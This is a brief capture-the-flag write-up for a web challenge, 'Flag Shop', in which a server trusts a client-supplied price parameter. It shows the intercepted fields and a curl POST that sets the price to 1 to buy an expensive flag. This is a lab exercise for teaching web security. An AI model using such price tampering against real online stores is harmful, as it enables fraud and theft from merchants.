# Flag Shop

| | |
|---|---|
| **Section** | Web Security |
| **Category** | web |
| **Solves** | 2156 |

## Overview

The site provides three purchasable flags with fixed prices (10€, 100€, 1000€). The available credit is 100€, making the 1000€ flag impossible to buy through the UI.

The purchase request is sent via a POST request containing multiple parameters, including the price.

## Solve

Intercepting the request for the 1000€ flag shows a parameter controlling the cost:

```
id=2
costo=1000
```

The server trusts the client-supplied `costo` value. By modifying it, the purchase can be downgraded:

```
curl -X POST -d "id=2" -d "costo=1" http://shops.challs.olicyber.it/buy.php
```

The server returns the flag after processing the manipulated price.